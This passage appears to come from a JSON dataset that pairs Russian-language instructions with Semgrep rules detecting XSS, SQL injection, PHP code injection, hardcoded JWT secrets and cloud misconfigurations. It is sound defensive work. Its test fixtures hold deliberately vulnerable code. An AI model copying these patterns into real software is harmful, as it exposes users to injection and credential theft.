    "output": "rules:\n- id: insecure-redirect\n  patterns:\n  - pattern-either:\n    - pattern: rewrite ... redirect\n    - pattern: rewrite ... permanent\n  - pattern-not-inside: rewrite ... https ... $host ... redirect\n  - pattern-not-inside: rewrite ... https ... $host ... permanent\n  - pattern-not-regex: (?i)https:\\/\\/\n  paths:\n    include:\n    - '*.conf'\n    - '*.vhost'\n    - '**/sites-available/*'\n    - '**/sites-enabled/*'\n  message: >-\n    Detected an insecure redirect in this nginx configuration.\n    If no scheme is specified, nginx will forward the request with the\n    incoming scheme. This could result in unencrypted communications.\n    To fix this, include the 'https' scheme.\n  languages: [generic]\n  severity: WARNING\n  metadata:\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    category: security\n    technology:\n    - nginx\n    confidence: LOW\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Nginx, где отсутствует явное указание схемы при перенаправлении URL. Если схема не указана, Nginx использует схему запроса клиента, что может привести к передаче конфиденциальных данных в незашифрованном виде. Правило ищет конструкции rewrite с операторами redirect или permanent, которые не содержат явно указанную схему 'https'. Также исключаются случаи, когда явно присутствует префикс 'https:' внутри выражения rewrite.\n\n# Ключевые элементы:\n- ID: insecure-redirect\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-redirect",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: aws-fsx-ontapfs-encrypted-with-cmk\nОписание уязвимости: Ensure FSX ONTAP file system is encrypted at rest using KMS CMKs. CMKs gives you control over the encryption key in terms of access and rotation.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-fsx-ontapfs-encrypted-with-cmk.tf\nresource \"aws_fsx_ontap_file_system\" \"pass\" {\n  storage_capacity    = 1024\n  subnet_ids          = [aws_subnet.test1.id, aws_subnet.test2.id]\n  deployment_type     = \"MULTI_AZ_1\"\n  throughput_capacity = 512\n  preferred_subnet_id = aws_subnet.test1.id\n  kms_key_id          = aws_kms_key.test.arn\n}\n# ruleid: aws-fsx-ontapfs-encrypted-with-cmk\nresource \"aws_fsx_ontap_file_system\" \"fail\" {\n  storage_capacity    = 1024\n  subnet_ids          = [aws_subnet.test1.id, aws_subnet.test2.id]\n  deployment_type     = \"MULTI_AZ_1\"\n  throughput_capacity = 512\n  preferred_subnet_id = aws_subnet.test1.id\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_fsx_ontap_file_system\" \"fail\" { ... }\n• resource \"aws_fsx_ontap_file_system\" \"another_fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"aws_fsx_ontap_file_system\" \"pass\" { ... kms_key_id = ... }\n• resource \"aws_fsx_ontap_file_system\" \"safe\" { ... kms_key_id = ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-fsx-ontapfs-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-fsx-ontapfs-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-fsx-ontapfs-encrypted-with-cmk\n  patterns:\n  - pattern: |\n      resource \"aws_fsx_ontap_file_system\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_fsx_ontap_file_system\" $ANYTHING {\n        ...\n        kms_key_id = ...\n        ...\n      }\n  message: >-\n    Ensure FSX ONTAP file system is encrypted at rest using KMS CMKs. CMKs gives you control over the\n    encryption key in terms of access and rotation.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS FSX ONTAP файловой системы, которые не используют идентификатор ключа управления ключами (kms_key_id) для шифрования при хранении в состоянии покоя. Правило использует шаблон ресурса aws_fsx_ontap_file_system и проверяет наличие идентификатора ключа внутри шаблона. Если идентификатор ключа отсутствует, правило отмечает код как небезопасный.\n\n# Ключевые элементы:\n- ID: aws-fsx-ontapfs-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-fsx-ontapfs-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения raw-html-format\nОписание уязвимости: User data flows into the host portion of this manually-constructed HTML. This can introduce a Cross-Site-Scripting (XSS) vulnerability if this comes from user-provided input. Consider using a sanitization library such as DOMPurify to sanitize the HTML within.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: raw-html-format.js\nconst express = require('express')\nconst app = express()\nconst port = 3000\n\napp.get('/test', async (req, res) => {\n    // ruleid: raw-html-format\n    res.send(\"<h1>\" + \"message: \" + req.query.message + \"</h1>\");\n})\n\napp.post('/test2', async (req, res) => {\n    // ruleid: raw-html-format\n    res.send(`<h1>message: ${req.query.message}</h1>`);\n})\n\napp.post('/test3', async (req, res) => {\n    // ruleid: raw-html-format\n    var html = \"<h1>\" + \"message: \" + req.query.message + \"</h1>\"\n    res.send(html);\n})\n\napp.post('/test4', async (req, res) => {\n    var html = \"<h1> message\"\n    // ruleid: raw-html-format\n    html = html.concat(req.query.message)\n    html = html.concat(\"</h1>\")\n    res.send(html);\n})\n\napp.post('/ok-test', async (req, res) => {\n    let { foobar } = req.query\n    let sanitizedParam = sanitizeUrl(foobar)\n    const url = `${baseUrl}/foo/bar?yo=123&param=${sanitizedParam}`\n    // ok: raw-html-format\n    return res.send(`<a href=\"${url}\" />`)\n})\n\napp.get('/ok', async (req, res) => {\n    // ok: raw-html-format\n    res.send(\"message: \" + req.query.message);\n})\n\napp.post('/ok2', async (req, res) => {\n    // ok: raw-html-format\n    res.send(`message: ${req.query.message}`);\n})\n\napp.post('/ok3', async (req, res) => {\n    // ok: raw-html-format\n    var data = \"message: \" + req.query.message;\n    res.send(data);\n})\n\napp.post('/ok4', async (req, res) => {\n    var data = \"message: \"\n    // ok: raw-html-format\n    data = data.concat(req.query.message)\n    res.send(data);\n})\n\n\napp.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))  # Ограничиваем длину\n\nОпасные паттерны:\n• res.send(\\\n• message: \\\n\nБезопасные паттерны:  \n• let { foobar } = req.query\\nlet sanitizedParam = sanitizeUrl(foobar)\\nconst url = `${baseUrl}/foo/bar?yo=123&param=${sanitizedParam}`; return res.send(`<a href=\\\n•  />`)\n• res.send(\\\n\nЛегенда аннотаций:\n- // ruleid:raw-html-format: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:raw-html-format: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: raw-html-format\n  message: >-\n    User data flows into the host portion of this manually-constructed HTML.\n    This can introduce a Cross-Site-Scripting (XSS) vulnerability if this comes from user-provided input.\n    Consider using a sanitization library such as DOMPurify to sanitize the HTML within.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n    category: security\n    technology:\n    - express\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - label: EXPRESS\n    patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n  - label: EXPRESSTS\n    patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n  - label: CLEAN\n    by-side-effect: true\n    patterns:\n      - pattern-either:\n          - pattern: $A($SOURCE)\n          - pattern: $SANITIZE. ... .$A($SOURCE)\n          - pattern: $A. ... .$SANITIZE($SOURCE)\n      - focus-metavariable: $SOURCE\n      - metavariable-regex:\n          metavariable: $A\n          regex: (?i)(.*valid|.*sanitiz)\n  pattern-sinks:\n  - requires: (EXPRESS and not CLEAN) or (EXPRESSTS and not CLEAN)\n    patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: '\"$HTMLSTR\" + $EXPR'\n          - pattern: '\"$HTMLSTR\".concat(...)'\n          - pattern: util.format($HTMLSTR, ...)\n        - metavariable-pattern:\n            metavariable: $HTMLSTR\n            language: generic\n            pattern: <$TAG ...\n      - patterns:\n        - pattern: |\n            `...`\n        - pattern-regex: |\n            .*<\\w+.*\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования необработанного пользовательского ввода в составе вручную сконструированного HTML-кода. Источниками потенциально небезопасного ввода являются запросы пользователя через параметры URL, тело запроса, маршрутизацию параметров, куки и заголовки HTTP-запросов. Синки обнаруживаются при конкатенации или использовании строковых шаблонов, содержащих HTML-теги, которые могут быть сформированы пользователем. Правило использует метапеременные для захвата различных источников и синок, а также специальные операторы для точного определения контекста и структуры кода.\n\n# Ключевые элементы:\n- ID: raw-html-format\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "raw-html-format",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: tainted-sql-string\nОписание уязвимости: Detected user input used to manually construct a SQL string. This is usually bad practice because manual construction could accidentally result in a SQL injection. An attacker could use a SQL injection to steal or modify contents of the database. Instead, use a parameterized query which is available by default in most database engines. Alternatively, consider using an object-relational mapper (ORM) such as Sequelize which will protect your queries.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tainted-sql-string.rb\nrequire 'pg'\n\ndef show(event:, context:)\n  conn = PG::Connection.open(:dbname => 'test')\n\n  # ok: tainted-sql-string\n  res = conn.exec_params('SELECT $1 AS a, $2 AS b, $3 AS c', [event['id'], 2, nil])\n\n  # ok: tainted-sql-string\n  res3 = conn.exec_params('SELECT * FROM foobar WHERE id = %{id}' % {id: \"something\"})\n  \n  # ok: tainted-sql-string\n  query = 'SELECT * FROM foobar WHERE id = ' + \"something\"\n  res4 = conn.exec_params(query)\n\n  # ruleid: tainted-sql-string\n  res2 = conn.exec_params('SELECT * FROM foobar WHERE id = %{id}' % {id: event['id']})\n\n  # ruleid: tainted-sql-string\n  res5 = conn.exec_params(\"SELECT * FROM foobar WHERE id = #{event['id']}\")\n\n  # ok: tainted-sql-string\n  puts(\"SELECT * FROM foobar WHERE id = #{event['id']}\")\n\n  {\n    body: res2\n  }\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• res2 = conn.exec_params('SELECT * FROM foobar WHERE id = %{id}' % {id: event['id']})\n• res5 = conn.exec_params(\"SELECT * FROM foobar WHERE id = #{event['id']}\")\n\nБезопасные паттерны:  \n• res = conn.exec_params('SELECT $1 AS a, $2 AS b, $3 AS c', [event['id'], 2, nil])\n• query = 'SELECT * FROM foobar WHERE id = ' + \"something\"; res4 = conn.exec_params(query)\n\nЛегенда аннотаций:\n- // ruleid:tainted-sql-string: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-sql-string: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-sql-string\n  languages: [ruby]\n  severity: ERROR\n  message: >-\n    Detected user input used to manually construct a SQL string. This is usually\n    bad practice because manual construction could accidentally result in a SQL\n    injection. An attacker could use a SQL injection to steal or modify contents\n    of the database. Instead, use a parameterized query which is available\n    by default in most database engines. Alternatively, consider using an\n    object-relational mapper (ORM) such as Sequelize which will protect your queries.\n  metadata:\n    references:\n    - https://rorsecurity.info/portfolio/ruby-on-rails-sql-injection-cheat-sheet\n    category: security\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    technology:\n    - aws-lambda\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: event\n    - pattern-inside: |\n        def $HANDLER(event, context)\n          ...\n        end\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern: |\n            \"...#{...}...\"\n        - pattern-regex: (?i)(select|delete|insert|create|update|alter|drop)\\b|\\w+\\s*!?[<>=].*\n      - patterns:\n        - pattern-either:\n          - pattern: Kernel::sprintf(\"$SQLSTR\", ...)\n          - pattern: |\n              \"$SQLSTR\" + $EXPR\n          - pattern: |\n              \"$SQLSTR\" % $EXPR\n        - metavariable-regex:\n            metavariable: $SQLSTR\n            regex: (?i)(select|delete|insert|create|update|alter|drop)\\b|\\w+\\s*!?[<>=].*\n    - pattern-not-inside: |\n        puts(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных методов построения SQL-запросов в Ruby. Источники (sources) определяют переменную 'event', которая может содержать пользовательский ввод. Синки (sinks) идентифицируют потенциально опасные конструкции SQL-запросов, такие как интерполяция строк или использование sprintf с небезопасными выражениями. Правило также исключает случаи, когда вывод просто печатается (puts), так как это обычно не представляет угрозы инъекции.\n\n# Ключевые элементы:\n- ID: tainted-sql-string\n- Язык: ruby \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tainted-sql-string",
      "language": "ruby",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: tainted-callable\nОписание уязвимости: Callable based on user input risks remote code execution.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: php\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: php\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tainted-callable.php\n<?php\n\n$foo = [2, 1, 3];\n\n// ok: tainted-callable\nvar_dump(usort($foo, 'strcmp'));\n\n// ok: tainted-callable\nvar_dump(usort($_GET['array'], 'strcmp'));\n\n// ruleid: tainted-callable\nvar_dump(usort($foo, $_GET['sortfunc']));  # Ограничиваем длину\n\nОпасные паттерны:\n• var_dump(usort($foo, $_GET['sortfunc']));\n• array_map($_GET['callback'], $data);\n• Closure::fromCallable($_POST['callable'])();\n\nБезопасные паттерны:  \n• var_dump(usort($foo, 'strcmp'));\n• array_map('strtoupper', $data);\n• Closure::fromCallable('someSafeFunction')();\n\nЛегенда аннотаций:\n- // ruleid:tainted-callable: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-callable: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-callable\n  severity: WARNING\n  message: >-\n    Callable based on user input risks remote code execution.\n  metadata:\n    technology:\n    - php\n    category: security\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://www.php.net/manual/en/language.types.callable.php\n    subcategory:\n    - vuln\n    impact: HIGH\n    likelihood: MEDIUM\n    confidence: MEDIUM\n  languages: [php]\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: $_GET\n      - pattern: $_POST\n      - pattern: $_COOKIE\n      - pattern: $_REQUEST\n      - pattern: file_get_contents('php://input')\n  pattern-sinks:\n  - patterns:\n    - pattern: $CALLABLE\n    - pattern-either:\n      - pattern-inside: $ARRAYITERATOR->uasort($CALLABLE)\n      - pattern-inside: $ARRAYITERATOR->uksort($CALLABLE)\n      - pattern-inside: $EVENTHTTP->setCallback($CALLABLE, ...)\n      - pattern-inside: $EVENTHTTPCONNECTION->setCloseCallback($CALLABLE, ...)\n      - pattern-inside: $EVLOOP->fork($CALLABLE, ...)\n      - pattern-inside: $EVLOOP->idle($CALLABLE, ...)\n      - pattern-inside: $EVLOOP->prepare($CALLABLE, ...)\n      - pattern-inside: $EVWATCHER->setCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setClientCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setCompleteCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setCreatedCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setDataCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setExceptionCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setFailCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setStatusCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setWarningCallback($CALLABLE)\n      - pattern-inside: $GEARMANCLIENT->setWorkloadCallback($CALLABLE)\n      - pattern-inside: $IMAGICK->setProgressMonitor($CALLABLE)\n      - pattern-inside: $OAUTHPROVIDER->consumerHandler($CALLABLE)\n      - pattern-inside: $OAUTHPROVIDER->tokenHandler($CALLABLE)\n      - pattern-inside: $PDO->sqliteCreateCollation($NAME, $CALLABLE)\n      - pattern-inside: $PDOSTATEMENT->fetchAll(PDO::FETCH_FUNC, $CALLABLE)\n      - pattern-inside: $SQLITE3->createCollation($NAME, $CALLABLE)\n      - pattern-inside: $SQLITE3->setAuthorizer($CALLABLE)\n      - pattern-inside: $ZIPARCHIVE->registerCancelCallback($CALLABLE)\n      - pattern-inside: $ZIPARCHIVE->registerProgressCallback($RATE, $CALLABLE)\n      - pattern-inside: $ZMQDEVICE->setIdleCallback($CALLABLE, ...)\n      - pattern-inside: $ZMQDEVICE->setTimerCallback($CALLABLE, ...)\n      - pattern-inside: apcu_entry($KEY, $CALLABLE, ...)\n      - pattern-inside: array_filter($ARRAY, $CALLABLE, ...)\n      - pattern-inside: array_map($CALLABLE, ...)\n      - pattern-inside: array_reduce($ARRAY, $CALLABLE, ...)\n      - pattern-inside: array_walk_recursive($ARRAY, $CALLABLE, ...)\n      - pattern-inside: array_walk($ARRAY, $CALLABLE, ...)\n      - pattern-inside: call_user_func_array($CALLABLE, ...)\n      - pattern-inside: call_user_func($CALLABLE, ...)\n      - pattern-inside: Closure::fromCallable($CALLABLE)\n      - pattern-inside: createCollation($NAME, $CALLABLE)\n      - pattern-inside: eio_grp($CALLABLE, ...)\n      - pattern-inside: eio_nop($PRI, $CALLABLE, ...)\n      - pattern-inside: eio_sync($PRI, $CALLABLE, ...)\n      - pattern-inside: EvPrepare::createStopped($CALLABLE, ...)\n      - pattern-inside: fann_set_callback($ANN, $CALLABLE)\n      - pattern-inside: fdf_enum_values($FDF_DOCUMENT, $CALLABLE, ...)\n      - pattern-inside: forward_static_call_array($CALLABLE, ...)\n      - pattern-inside: forward_static_call($CALLABLE, ...)\n      - pattern-inside: header_register_callback($CALLABLE)\n      - pattern-inside: ibase_set_event_handler($CALLABLE, ...)\n      - pattern-inside: IntlChar::enumCharTypes($CALLABLE)\n      - pattern-inside: iterator_apply($ITERATOR, $CALLABLE)\n      - pattern-inside: ldap_set_rebind_proc($LDAP, $CALLABLE)\n      - pattern-inside: libxml_set_external_entity_loader($CALLABLE, ...)\n      - pattern-inside: new CallbackFilterIterator($ITERATOR, $CALLABLE)\n      - pattern-inside: new EvCheck($CALLABLE, ...)\n      - pattern-inside: new EventHttpRequest($CALLABLE, ...)\n      - pattern-inside: new EvFork($CALLABLE, ...)\n      - pattern-inside: new EvIdle($CALLABLE, ...)\n      - pattern-inside: new Fiber($CALLABLE)\n      - pattern-inside: new Memcached($PERSISTENT_ID, $CALLABLE, ...)\n      - pattern-inside: new RecursiveCallbackFilterIterator($ITERATOR, $CALLABLE)\n      - pattern-inside: new Zookeeper($HOST, $CALLABLE, ...)\n      - pattern-inside: ob_start($CALLABLE, ...)\n      - pattern-inside: oci_register_taf_callback($CONNECTION, $CALLABLE)\n      - pattern-inside: readline_callback_handler_install($PROMPT, $CALLABLE)\n      - pattern-inside: readline_completion_function($CALLABLE)\n      - pattern-inside: register_shutdown_function($CALLABLE, ...)\n      - pattern-inside: register_tick_function($CALLABLE, ...)\n      - pattern-inside: rnp_ffi_set_pass_provider($FFI, $CALLABLE)\n      - pattern-inside: sapi_windows_set_ctrl_handler($CALLABLE, ...)\n      - pattern-inside: set_error_handler($CALLABLE, ...)\n      - pattern-inside: set_exception_handler($CALLABLE)\n      - pattern-inside: setAuthorizer($CALLABLE)\n      - pattern-inside: spl_autoload_register($CALLABLE, ...)\n      - pattern-inside: uasort($ARRAY, $CALLABLE)\n      - pattern-inside: uksort($ARRAY, $CALLABLE)\n      - pattern-inside: usort($ARRAY, $CALLABLE)\n      - pattern-inside: xml_set_character_data_handler($PARSER, $CALLABLE)\n      - pattern-inside: xml_set_default_handler($PARSER, $CALLABLE)\n      - pattern-inside: xml_set_element_handler($PARSER, $CALLABLE, $CALLABLE)\n      - pattern-inside: xml_set_notation_decl_handler($PARSER, $CALLABLE)\n      - pattern-inside: Yar_Concurrent_Client::loop($CALLABLE, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования callable-функций, которые передаются на основе пользовательского ввода. Источники tainted-данных определяются как переменные, полученные через GET, POST, COOKIE, REQUEST и файл php://input. Синки (санкции) обнаруживаются при использовании этих callable-функций внутри различных PHP методов и функций, таких как usort, uksort, array_map и другие. Правило использует pattern-sources и pattern-sinks для идентификации потенциально опасных вызовов.\n\n# Ключевые элементы:\n- ID: tainted-callable\n- Язык: php \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tainted-callable",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения azure-keyvault-enables-soft-delete\nОписание уязвимости: Ensure that key vault enables soft delete\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-keyvault-enables-soft-delete.tf\n# fail\n# ruleid: azure-keyvault-enables-soft-delete\nresource \"azurerm_key_vault\" \"example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.example.location\n    resource_group_name         = azurerm_resource_group.example.name\n    enabled_for_disk_encryption = true\n    tenant_id                   = data.azurerm_client_config.current.tenant_id\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n    soft_delete_enabled = false\n    sku_name = \"standard\"\n\n    access_policy {\n    tenant_id = data.azurerm_client_config.current.tenant_id\n    object_id = data.azurerm_client_config.current.object_id\n\n    key_permissions = [\n        \"Get\",\n    ]\n\n    secret_permissions = [\n        \"Get\",\n    ]\n\n    storage_permissions = [\n        \"Get\",\n    ]\n    }\n}\n\n# pass\nresource \"azurerm_key_vault\" \"example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.example.location\n    resource_group_name         = azurerm_resource_group.example.name\n    enabled_for_disk_encryption = true\n    tenant_id                   = data.azurerm_client_config.current.tenant_id\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n  \n    sku_name = \"standard\"\n  \n    access_policy {\n      tenant_id = data.azurerm_client_config.current.tenant_id\n      object_id = data.azurerm_client_config.current.object_id\n  \n      key_permissions = [\n        \"Get\",\n      ]\n  \n      secret_permissions = [\n        \"Get\",\n      ]\n  \n      storage_permissions = [\n        \"Get\",\n      ]\n    }\n}\n\n# pass\nresource \"azurerm_key_vault\" \"example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.example.location\n    resource_group_name         = azurerm_resource_group.example.name\n    enabled_for_disk_encryption = true\n    tenant_id                   = data.azure  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_key_vault\" \"example\" { ... soft_delete_enabled = false ... }\n• resource \"azurerm_key_vault\" \"kv\" { ... soft_delete_enabled = false ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_key_vault\" \"example\" { ... soft_delete_enabled = true ... }\n• resource \"azurerm_key_vault\" \"kv\" { ... soft_delete_enabled = true ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-keyvault-enables-soft-delete: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-keyvault-enables-soft-delete: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-keyvault-enables-soft-delete\n    message: >-\n      Ensure that key vault enables soft delete\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_key_vault\" \"...\" {\n          ...\n          soft_delete_enabled = false\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure Key Vault, где параметр 'soft_delete_enabled' установлен в значение 'false'. В HCL-коде это проверяется путем поиска блока ресурса 'azurerm_key_vault', внутри которого присутствует строка 'soft_delete_enabled = false'. Правило использует оператор pattern-inside для ограничения области поиска внутри конкретного типа ресурса.\n\n# Ключевые элементы:\n- ID: azure-keyvault-enables-soft-delete\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-keyvault-enables-soft-delete",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: scala-jwt-hardcoded-secret\nОписание уязвимости: Hardcoded JWT secret or private key is used. This is a Insufficiently Protected Credentials weakness: https://cwe.mitre.org/data/definitions/522.html Consider using an appropriate security mechanism to protect the credentials (e.g. keeping secrets in environment variables)\nCWE: CWE-522: Insufficiently Protected Credentials\nТип анализа: search\nЯзык: scala",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: search\n- CWE: CWE-522: Insufficiently Protected Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: jwt-hardcode.scala\npackage jwt_test.jwt_test_1\n\nimport com.auth0.jwt.JWT\nimport com.auth0.jwt.algorithms.Algorithm\nimport com.auth0.jwt.exceptions.JWTCreationException\n\nobject App {\n    val secret = \"secret\"\n}\n\nclass App {\n\n    def bad1() = {\n        try {\n            // ruleid: scala-jwt-hardcoded-secret\n            Algorithm algorithm = Algorithm.HMAC256(\"secret\");\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n        } catch (exception: JWTCreationException){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n    }\n\n    def ok1(secretKey: String) = {\n        try {\n            // ok: scala-jwt-hardcoded-secret\n            Algorithm algorithm = Algorithm.HMAC256(secretKey);\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n        } catch (exception: JWTCreationException){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: jwt-hardcode.scala\ncom.auth0.jwt.algorithms.Algorithm.HMAC256(\"secret\");\n• // File: jwt-hardcode-scala.scala\nval secret = \"secret\"\ncom.auth0.jwt.algorithms.Algorithm.HMAC256(secret);\n• // File: jwt-hardcode-class.scala\nclass JwtClass{\n  val secret = 